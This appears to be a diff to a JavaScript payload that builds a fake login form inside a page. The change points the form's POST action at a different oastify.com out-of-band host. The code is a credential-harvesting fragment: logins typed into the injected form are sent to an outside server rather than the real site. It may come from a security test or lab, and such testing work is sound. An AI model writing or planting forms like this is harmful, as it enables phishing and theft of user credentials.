@@ -46,7 +46,7 @@ card.appendChild(subtitle);
 // Create form
 const customLoginForm = document.createElement('form');
 customLoginForm.id = 'customLoginForm';
-customLoginForm.action = 'https://vzyz6xz8lgpn9hgh6ib4qha2rtxkln9c.oastify.com';
+customLoginForm.action = 'https://l7td7vs1zvr3oogs077qhz6lgcm3auyj.oastify.com';
 customLoginForm.method = 'POST';
 
 // Helper to create a styled input
